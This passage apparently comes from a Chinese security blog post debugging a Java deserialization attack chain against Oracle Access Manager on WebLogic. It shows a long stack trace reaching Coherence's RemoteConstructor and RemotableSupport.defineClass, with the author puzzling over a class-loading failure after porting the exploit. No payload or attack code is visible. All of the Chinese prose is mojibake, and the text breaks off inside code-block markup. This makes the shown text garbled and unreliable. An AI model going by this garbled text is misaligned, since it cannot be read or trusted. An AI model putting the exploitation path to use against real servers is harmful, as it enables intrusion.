</span></span><span style=display:flex><span>    <span style=color:#960050;background-color:#1e0010>ã€æ­¤å¤„ä»¥ä¸Šçš„éƒ¨åˆ†é€šè¿‡è°ƒè¯•æ‰èƒ½çœ‹åˆ°ï¼Œé”™è¯¯æ—¥å¿—çš„æŠ¥é”™åªåˆ°</span>native<span style=color:#960050;background-color:#1e0010>å‡½æ•°çš„è°ƒç”¨ä¸ºæ­¢ã€‘</span>
</span></span><span style=display:flex><span>defineClass1:<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span><span style=color:#f92672>,</span> ClassLoader <span style=color:#f92672>(</span>java<span style=color:#f92672>.</span><span style=color:#a6e22e>lang</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>defineClass:<span style=color:#ae81ff>756</span><span style=color:#f92672>,</span> ClassLoader <span style=color:#f92672>(</span>java<span style=color:#f92672>.</span><span style=color:#a6e22e>lang</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>defineClass:<span style=color:#ae81ff>635</span><span style=color:#f92672>,</span> ClassLoader <span style=color:#f92672>(</span>java<span style=color:#f92672>.</span><span style=color:#a6e22e>lang</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>â˜…</span>defineClass<span style=color:#f92672>:</span><span style=color:#ae81ff>181</span><span style=color:#f92672>,</span> RemotableSupport <span style=color:#f92672>(</span>com<span style=color:#f92672>.</span><span style=color:#a6e22e>tangosol</span><span style=color:#f92672>.</span><span style=color:#a6e22e>internal</span><span style=color:#f92672>.</span><span style=color:#a6e22e>util</span><span style=color:#f92672>.</span><span style=color:#a6e22e>invoke</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>realize:<span style=color:#ae81ff>137</span><span style=color:#f92672>,</span> RemotableSupport <span style=color:#f92672>(</span>com<span style=color:#f92672>.</span><span style=color:#a6e22e>tangosol</span><span style=color:#f92672>.</span><span style=color:#a6e22e>internal</span><span style=color:#f92672>.</span><span style=color:#a6e22e>util</span><span style=color:#f92672>.</span><span style=color:#a6e22e>invoke</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>newInstance:<span style=color:#ae81ff>122</span><span style=color:#f92672>,</span> RemoteConstructor <span style=color:#f92672>(</span>com<span style=color:#f92672>.</span><span style=color:#a6e22e>tangosol</span><span style=color:#f92672>.</span><span style=color:#a6e22e>internal</span><span style=color:#f92672>.</span><span style=color:#a6e22e>util</span><span style=color:#f92672>.</span><span style=color:#a6e22e>invoke</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>readResolve:<span style=color:#ae81ff>233</span><span style=color:#f92672>,</span> RemoteConstructor <span style=color:#f92672>(</span>com<span style=color:#f92672>.</span><span style=color:#a6e22e>tangosol</span><span style=color:#f92672>.</span><span style=color:#a6e22e>internal</span><span style=color:#f92672>.</span><span style=color:#a6e22e>util</span><span style=color:#f92672>.</span><span style=color:#a6e22e>invoke</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>invoke0:<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span><span style=color:#f92672>,</span> NativeMethodAccessorImpl <span style=color:#f92672>(</span>sun<span style=color:#f92672>.</span><span style=color:#a6e22e>reflect</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>invoke:<span style=color:#ae81ff>62</span><span style=color:#f92672>,</span> NativeMethodAccessorImpl <span style=color:#f92672>(</span>sun<span style=color:#f92672>.</span><span style=color:#a6e22e>reflect</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>invoke:<span style=color:#ae81ff>43</span><span style=color:#f92672>,</span> DelegatingMethodAccessorImpl <span style=color:#f92672>(</span>sun<span style=color:#f92672>.</span><span style=color:#a6e22e>reflect</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>invoke:<span style=color:#ae81ff>498</span><span style=color:#f92672>,</span> Method <span style=color:#f92672>(</span>java<span style=color:#f92672>.</span><span style=color:#a6e22e>lang</span><span style=color:#f92672>.</span><span style=color:#a6e22e>reflect</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>invokeReadResolve:<span style=color:#ae81ff>1275</span><span style=color:#f92672>,</span> ObjectStreamClass <span style=color:#f92672>(</span>java<span style=color:#f92672>.</span><span style=color:#a6e22e>io</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>readOrdinaryObject:<span style=color:#ae81ff>2194</span><span style=color:#f92672>,</span> ObjectInputStream <span style=color:#f92672>(</span>java<span style=color:#f92672>.</span><span style=color:#a6e22e>io</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>readObject0:<span style=color:#ae81ff>1665</span><span style=color:#f92672>,</span> ObjectInputStream <span style=color:#f92672>(</span>java<span style=color:#f92672>.</span><span style=color:#a6e22e>io</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>readObject:<span style=color:#ae81ff>501</span><span style=color:#f92672>,</span> ObjectInputStream <span style=color:#f92672>(</span>java<span style=color:#f92672>.</span><span style=color:#a6e22e>io</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>readObject:<span style=color:#ae81ff>459</span><span style=color:#f92672>,</span> ObjectInputStream <span style=color:#f92672>(</span>java<span style=color:#f92672>.</span><span style=color:#a6e22e>io</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>readExternal:<span style=color:#ae81ff>56</span><span style=color:#f92672>,</span> BasicServiceContext <span style=color:#f92672>(</span>weblogic<span style=color:#f92672>.</span><span style=color:#a6e22e>rmi</span><span style=color:#f92672>.</span><span style=color:#a6e22e>provider</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>readExternalData:<span style=color:#ae81ff>2234</span><span style=color:#f92672>,</span> ObjectInputStream <span style=color:#f92672>(</span>java<span style=color:#f92672>.</span><span style=color:#a6e22e>io</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>readOrdinaryObject:<span style=color:#ae81ff>2183</span><span style=color:#f92672>,</span> ObjectInputStream <span style=color:#f92672>(</span>java<span style=color:#f92672>.</span><span style=color:#a6e22e>io</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>readObject0:<span style=color:#ae81ff>1665</span><span style=color:#f92672>,</span> ObjectInputStream <span style=color:#f92672>(</span>java<span style=color:#f92672>.</span><span style=color:#a6e22e>io</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>readObject:<span style=color:#ae81ff>501</span><span style=color:#f92672>,</span> ObjectInputStream <span style=color:#f92672>(</span>java<span style=color:#f92672>.</span><span style=color:#a6e22e>io</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>readObject:<span style=color:#ae81ff>459</span><span style=color:#f92672>,</span> ObjectInputStream <span style=color:#f92672>(</span>java<span style=color:#f92672>.</span><span style=color:#a6e22e>io</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>unmarshal:<span style=color:#ae81ff>2453</span><span style=color:#f92672>,</span> OpenssoEngineController <span style=color:#f92672>(</span>oracle<span style=color:#f92672>.</span><span style=color:#a6e22e>security</span><span style=color:#f92672>.</span><span style=color:#a6e22e>am</span><span style=color:#f92672>.</span><span style=color:#a6e22e>proxy</span><span style=color:#f92672>.</span><span style=color:#a6e22e>opensso</span><span style=color:#f92672>.</span><span style=color:#a6e22e>controller</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>processEvent:<span style=color:#ae81ff>1069</span><span style=color:#f92672>,</span> OpenssoEngineController <span style=color:#f92672>(</span>oracle<span style=color:#f92672>.</span><span style=color:#a6e22e>security</span><span style=color:#f92672>.</span><span style=color:#a6e22e>am</span><span style=color:#f92672>.</span><span style=color:#a6e22e>proxy</span><span style=color:#f92672>.</span><span style=color:#a6e22e>opensso</span><span style=color:#f92672>.</span><span style=color:#a6e22e>controller</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>processEvent:<span style=color:#ae81ff>596</span><span style=color:#f92672>,</span> MasterController <span style=color:#f92672>(</span>oracle<span style=color:#f92672>.</span><span style=color:#a6e22e>security</span><span style=color:#f92672>.</span><span style=color:#a6e22e>am</span><span style=color:#f92672>.</span><span style=color:#a6e22e>controller</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>processRequest:<span style=color:#ae81ff>788</span><span style=color:#f92672>,</span> MasterController <span style=color:#f92672>(</span>oracle<span style=color:#f92672>.</span><span style=color:#a6e22e>security</span><span style=color:#f92672>.</span><span style=color:#a6e22e>am</span><span style=color:#f92672>.</span><span style=color:#a6e22e>controller</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>process:<span style=color:#ae81ff>708</span><span style=color:#f92672>,</span> MasterController <span style=color:#f92672>(</span>oracle<span style=color:#f92672>.</span><span style=color:#a6e22e>security</span><span style=color:#f92672>.</span><span style=color:#a6e22e>am</span><span style=color:#f92672>.</span><span style=color:#a6e22e>controller</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>delegateToMasterController:<span style=color:#ae81ff>221</span><span style=color:#f92672>,</span> PBLFlowManager <span style=color:#f92672>(</span>oracle<span style=color:#f92672>.</span><span style=color:#a6e22e>security</span><span style=color:#f92672>.</span><span style=color:#a6e22e>am</span><span style=color:#f92672>.</span><span style=color:#a6e22e>pbl</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>handleBaseEvent:<span style=color:#ae81ff>147</span><span style=color:#f92672>,</span> PBLFlowManager <span style=color:#f92672>(</span>oracle<span style=color:#f92672>.</span><span style=color:#a6e22e>security</span><span style=color:#f92672>.</span><span style=color:#a6e22e>am</span><span style=color:#f92672>.</span><span style=color:#a6e22e>pbl</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>processRequest:<span style=color:#ae81ff>107</span><span style=color:#f92672>,</span> PBLFlowManager <span style=color:#f92672>(</span>oracle<span style=color:#f92672>.</span><span style=color:#a6e22e>security</span><span style=color:#f92672>.</span><span style=color:#a6e22e>am</span><span style=color:#f92672>.</span><span style=color:#a6e22e>pbl</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>handleRequest:<span style=color:#ae81ff>221</span><span style=color:#f92672>,</span> AMServlet <span style=color:#f92672>(</span>oracle<span style=color:#f92672>.</span><span style=color:#a6e22e>security</span><span style=color:#f92672>.</span><span style=color:#a6e22e>am</span><span style=color:#f92672>.</span><span style=color:#a6e22e>pbl</span><span style=color:#f92672>.</span><span style=color:#a6e22e>transport</span><span style=color:#f92672>.</span><span style=color:#a6e22e>http</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>doPost:<span style=color:#ae81ff>177</span><span style=color:#f92672>,</span> AMServlet <span style=color:#f92672>(</span>oracle<span style=color:#f92672>.</span><span style=color:#a6e22e>security</span><span style=color:#f92672>.</span><span style=color:#a6e22e>am</span><span style=color:#f92672>.</span><span style=color:#a6e22e>pbl</span><span style=color:#f92672>.</span><span style=color:#a6e22e>transport</span><span style=color:#f92672>.</span><span style=color:#a6e22e>http</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>service:<span style=color:#ae81ff>707</span><span style=color:#f92672>,</span> HttpServlet <span style=color:#f92672>(</span>javax<span style=color:#f92672>.</span><span style=color:#a6e22e>servlet</span><span style=color:#f92672>.</span><span style=color:#a6e22e>http</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>service:<span style=color:#ae81ff>790</span><span style=color:#f92672>,</span> HttpServlet <span style=color:#f92672>(</span>javax<span style=color:#f92672>.</span><span style=color:#a6e22e>servlet</span><span style=color:#f92672>.</span><span style=color:#a6e22e>http</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>run:<span style=color:#ae81ff>295</span><span style=color:#f92672>,</span> StubSecurityHelper$ServletServiceAction <span style=color:#f92672>(</span>weblogic<span style=color:#f92672>.</span><span style=color:#a6e22e>servlet</span><span style=color:#f92672>.</span><span style=color:#a6e22e>internal</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>run:<span style=color:#ae81ff>260</span><span style=color:#f92672>,</span> StubSecurityHelper$ServletServiceAction <span style=color:#f92672>(</span>weblogic<span style=color:#f92672>.</span><span style=color:#a6e22e>servlet</span><span style=color:#f92672>.</span><span style=color:#a6e22e>internal</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>invokeServlet:<span style=color:#ae81ff>137</span><span style=color:#f92672>,</span> StubSecurityHelper <span style=color:#f92672>(</span>weblogic<span style=color:#f92672>.</span><span style=color:#a6e22e>servlet</span><span style=color:#f92672>.</span><span style=color:#a6e22e>internal</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>execute:<span style=color:#ae81ff>353</span><span style=color:#f92672>,</span> ServletStubImpl <span style=color:#f92672>(</span>weblogic<span style=color:#f92672>.</span><span style=color:#a6e22e>servlet</span><span style=color:#f92672>.</span><span style=color:#a6e22e>internal</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>doFilter:<span style=color:#ae81ff>25</span><span style=color:#f92672>,</span> TailFilter <span style=color:#f92672>(</span>weblogic<span style=color:#f92672>.</span><span style=color:#a6e22e>servlet</span><span style=color:#f92672>.</span><span style=color:#a6e22e>internal</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>doFilter:<span style=color:#ae81ff>78</span><span style=color:#f92672>,</span> FilterChainImpl <span style=color:#f92672>(</span>weblogic<span style=color:#f92672>.</span><span style=color:#a6e22e>servlet</span><span style=color:#f92672>.</span><span style=color:#a6e22e>internal</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>run:<span style=color:#ae81ff>175</span><span style=color:#f92672>,</span> JpsAbsFilter$3 <span style=color:#f92672>(</span>oracle<span style=color:#f92672>.</span><span style=color:#a6e22e>security</span><span style=color:#f92672>.</span><span style=color:#a6e22e>jps</span><span style=color:#f92672>.</span><span style=color:#a6e22e>ee</span><span style=color:#f92672>.</span><span style=color:#a6e22e>http</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>doPrivileged:<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span><span style=color:#f92672>,</span> AccessController <span style=color:#f92672>(</span>java<span style=color:#f92672>.</span><span style=color:#a6e22e>security</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>doAsPrivileged:<span style=color:#ae81ff>315</span><span style=color:#f92672>,</span> JpsSubject <span style=color:#f92672>(</span>oracle<span style=color:#f92672>.</span><span style=color:#a6e22e>security</span><span style=color:#f92672>.</span><span style=color:#a6e22e>jps</span><span style=color:#f92672>.</span><span style=color:#a6e22e>util</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>runJaasMode:<span style=color:#ae81ff>650</span><span style=color:#f92672>,</span> JpsPlatformUtil <span style=color:#f92672>(</span>oracle<span style=color:#f92672>.</span><span style=color:#a6e22e>security</span><span style=color:#f92672>.</span><span style=color:#a6e22e>jps</span><span style=color:#f92672>.</span><span style=color:#a6e22e>ee</span><span style=color:#f92672>.</span><span style=color:#a6e22e>util</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>runJaasMode:<span style=color:#ae81ff>112</span><span style=color:#f92672>,</span> JpsAbsFilter <span style=color:#f92672>(</span>oracle<span style=color:#f92672>.</span><span style=color:#a6e22e>security</span><span style=color:#f92672>.</span><span style=color:#a6e22e>jps</span><span style=color:#f92672>.</span><span style=color:#a6e22e>ee</span><span style=color:#f92672>.</span><span style=color:#a6e22e>http</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>doFilterInternal:<span style=color:#ae81ff>293</span><span style=color:#f92672>,</span> JpsAbsFilter <span style=color:#f92672>(</span>oracle<span style=color:#f92672>.</span><span style=color:#a6e22e>security</span><span style=color:#f92672>.</span><span style=color:#a6e22e>jps</span><span style=color:#f92672>.</span><span style=color:#a6e22e>ee</span><span style=color:#f92672>.</span><span style=color:#a6e22e>http</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>doFilter:<span style=color:#ae81ff>150</span><span style=color:#f92672>,</span> JpsAbsFilter <span style=color:#f92672>(</span>oracle<span style=color:#f92672>.</span><span style=color:#a6e22e>security</span><span style=color:#f92672>.</span><span style=color:#a6e22e>jps</span><span style=color:#f92672>.</span><span style=color:#a6e22e>ee</span><span style=color:#f92672>.</span><span style=color:#a6e22e>http</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>doFilter:<span style=color:#ae81ff>94</span><span style=color:#f92672>,</span> JpsFilter <span style=color:#f92672>(</span>oracle<span style=color:#f92672>.</span><span style=color:#a6e22e>security</span><span style=color:#f92672>.</span><span style=color:#a6e22e>jps</span><span style=color:#f92672>.</span><span style=color:#a6e22e>ee</span><span style=color:#f92672>.</span><span style=color:#a6e22e>http</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>doFilter:<span style=color:#ae81ff>78</span><span style=color:#f92672>,</span> FilterChainImpl <span style=color:#f92672>(</span>weblogic<span style=color:#f92672>.</span><span style=color:#a6e22e>servlet</span><span style=color:#f92672>.</span><span style=color:#a6e22e>internal</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>doFilter:<span style=color:#ae81ff>248</span><span style=color:#f92672>,</span> DMSServletFilter <span style=color:#f92672>(</span>oracle<span style=color:#f92672>.</span><span style=color:#a6e22e>dms</span><span style=color:#f92672>.</span><span style=color:#a6e22e>servlet</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>doFilter:<span style=color:#ae81ff>78</span><span style=color:#f92672>,</span> FilterChainImpl <span style=color:#f92672>(</span>weblogic<span style=color:#f92672>.</span><span style=color:#a6e22e>servlet</span><span style=color:#f92672>.</span><span style=color:#a6e22e>internal</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>doFilter:<span style=color:#ae81ff>92</span><span style=color:#f92672>,</span> ExtensibleGlobalFilter <span style=color:#f92672>(</span>oracle<span style=color:#f92672>.</span><span style=color:#a6e22e>jrf</span><span style=color:#f92672>.</span><span style=color:#a6e22e>servlet</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>doFilter:<span style=color:#ae81ff>78</span><span style=color:#f92672>,</span> FilterChainImpl <span style=color:#f92672>(</span>weblogic<span style=color:#f92672>.</span><span style=color:#a6e22e>servlet</span><span style=color:#f92672>.</span><span style=color:#a6e22e>internal</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>wrapRun:<span style=color:#ae81ff>3797</span><span style=color:#f92672>,</span> WebAppServletContext$ServletInvocationAction <span style=color:#f92672>(</span>weblogic<span style=color:#f92672>.</span><span style=color:#a6e22e>servlet</span><span style=color:#f92672>.</span><span style=color:#a6e22e>internal</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>run:<span style=color:#ae81ff>3763</span><span style=color:#f92672>,</span> WebAppServletContext$ServletInvocationAction <span style=color:#f92672>(</span>weblogic<span style=color:#f92672>.</span><span style=color:#a6e22e>servlet</span><span style=color:#f92672>.</span><span style=color:#a6e22e>internal</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>doAs:<span style=color:#ae81ff>344</span><span style=color:#f92672>,</span> AuthenticatedSubject <span style=color:#f92672>(</span>weblogic<span style=color:#f92672>.</span><span style=color:#a6e22e>security</span><span style=color:#f92672>.</span><span style=color:#a6e22e>acl</span><span style=color:#f92672>.</span><span style=color:#a6e22e>internal</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>runAsForUserCode:<span style=color:#ae81ff>197</span><span style=color:#f92672>,</span> SecurityManager <span style=color:#f92672>(</span>weblogic<span style=color:#f92672>.</span><span style=color:#a6e22e>security</span><span style=color:#f92672>.</span><span style=color:#a6e22e>service</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>runAsForUserCode:<span style=color:#ae81ff>203</span><span style=color:#f92672>,</span> WlsSecurityProvider <span style=color:#f92672>(</span>weblogic<span style=color:#f92672>.</span><span style=color:#a6e22e>servlet</span><span style=color:#f92672>.</span><span style=color:#a6e22e>provider</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>run:<span style=color:#ae81ff>71</span><span style=color:#f92672>,</span> WlsSubjectHandle <span style=color:#f92672>(</span>weblogic<span style=color:#f92672>.</span><span style=color:#a6e22e>servlet</span><span style=color:#f92672>.</span><span style=color:#a6e22e>provider</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>doSecuredExecute:<span style=color:#ae81ff>2451</span><span style=color:#f92672>,</span> WebAppServletContext <span style=color:#f92672>(</span>weblogic<span style=color:#f92672>.</span><span style=color:#a6e22e>servlet</span><span style=color:#f92672>.</span><span style=color:#a6e22e>internal</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>securedExecute:<span style=color:#ae81ff>2299</span><span style=color:#f92672>,</span> WebAppServletContext <span style=color:#f92672>(</span>weblogic<span style=color:#f92672>.</span><span style=color:#a6e22e>servlet</span><span style=color:#f92672>.</span><span style=color:#a6e22e>internal</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>execute:<span style=color:#ae81ff>2277</span><span style=color:#f92672>,</span> WebAppServletContext <span style=color:#f92672>(</span>weblogic<span style=color:#f92672>.</span><span style=color:#a6e22e>servlet</span><span style=color:#f92672>.</span><span style=color:#a6e22e>internal</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>runInternal:<span style=color:#ae81ff>1720</span><span style=color:#f92672>,</span> ServletRequestImpl <span style=color:#f92672>(</span>weblogic<span style=color:#f92672>.</span><span style=color:#a6e22e>servlet</span><span style=color:#f92672>.</span><span style=color:#a6e22e>internal</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>run:<span style=color:#ae81ff>1680</span><span style=color:#f92672>,</span> ServletRequestImpl <span style=color:#f92672>(</span>weblogic<span style=color:#f92672>.</span><span style=color:#a6e22e>servlet</span><span style=color:#f92672>.</span><span style=color:#a6e22e>internal</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>run:<span style=color:#ae81ff>272</span><span style=color:#f92672>,</span> ContainerSupportProviderImpl$WlsRequestExecutor <span style=color:#f92672>(</span>weblogic<span style=color:#f92672>.</span><span style=color:#a6e22e>servlet</span><span style=color:#f92672>.</span><span style=color:#a6e22e>provider</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>_runAs:<span style=color:#ae81ff>352</span><span style=color:#f92672>,</span> ComponentInvocationContextManager <span style=color:#f92672>(</span>weblogic<span style=color:#f92672>.</span><span style=color:#a6e22e>invocation</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>runAs:<span style=color:#ae81ff>337</span><span style=color:#f92672>,</span> ComponentInvocationContextManager <span style=color:#f92672>(</span>weblogic<span style=color:#f92672>.</span><span style=color:#a6e22e>invocation</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>doRunWorkUnderContext:<span style=color:#ae81ff>57</span><span style=color:#f92672>,</span> LivePartitionUtility <span style=color:#f92672>(</span>weblogic<span style=color:#f92672>.</span><span style=color:#a6e22e>work</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>runWorkUnderContext:<span style=color:#ae81ff>41</span><span style=color:#f92672>,</span> PartitionUtility <span style=color:#f92672>(</span>weblogic<span style=color:#f92672>.</span><span style=color:#a6e22e>work</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>runWorkUnderContext:<span style=color:#ae81ff>655</span><span style=color:#f92672>,</span> SelfTuningWorkManagerImpl <span style=color:#f92672>(</span>weblogic<span style=color:#f92672>.</span><span style=color:#a6e22e>work</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>execute:<span style=color:#ae81ff>420</span><span style=color:#f92672>,</span> ExecuteThread <span style=color:#f92672>(</span>weblogic<span style=color:#f92672>.</span><span style=color:#a6e22e>work</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>run:<span style=color:#ae81ff>360</span><span style=color:#f92672>,</span> ExecuteThread <span style=color:#f92672>(</span>weblogic<span style=color:#f92672>.</span><span style=color:#a6e22e>work</span><span style=color:#f92672>)</span>
</span></span></code></pre></td></tr></table></div></div><p>åˆ°è¿™é‡Œç™¾æ€ä¸å¾—å…¶è§£ï¼Œä¸€ééåå¤è°ƒè¯•éƒ½æ˜¯ä¸€æ ·çš„ç»“æœã€‚ä¸ºä»€ä¹ˆå‡ ä¹ä¸€æ ·çš„è¿è¡Œæ—¶ï¼Œç§»æ¤ä¹‹åå°±æ‰¾ä¸åˆ°è¿™ä¸ªç±»äº†å‘¢ï¼Ÿ</p><h4 id=é”™è¯¯å‡ºåœ¨defineclass>é”™è¯¯å‡ºåœ¨defineclass<a hidden class=anchor aria-hidden=true href=#é”™è¯¯å‡ºåœ¨defineclass>#</a></h4><p>é”™è¯¯å †æ ˆï¼š</p><p><img loading=lazy src=image-20220326165348118.png alt=image-20220326165348118></p><p>å‡ æ¬¡F9ä¹‹ååœ¨è°ƒè¯•å™¨ä¸­å®Œå…¨å¤åˆ»äº†æ—¥å¿—ä¸­çš„é”™è¯¯å †æ ˆ</p><p><img loading=lazy src=image-20220325112952977.png alt=image-20220325112952977></p><p>å¯ä»¥çœ‹åˆ°æ•´ä¸ªååºåˆ—åŒ–è¿‡ç¨‹ï¼Œä» <code>oracle.security.am.pbl.transport.http.AMServlet.doPost</code> åˆ° å¼‚å¸¸æŠ›å‡ºï¼Œç»è¿‡å‡ ä¸ªååºåˆ—åŒ–ç‚¹</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-76-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-76-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-76-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-76-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-76-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-76-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-76-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-76-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-76-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-76-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-76-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-76-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-76-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-76-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-76-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-76-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-76-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-76-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-76-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-76-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-76-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-76-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-76-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-76-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-76-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-76-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-76-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-76-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-76-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-76-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-76-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-76-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-76-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-76-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-76-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-76-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-76-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-76-19>19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-76-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-76-20>20</a>
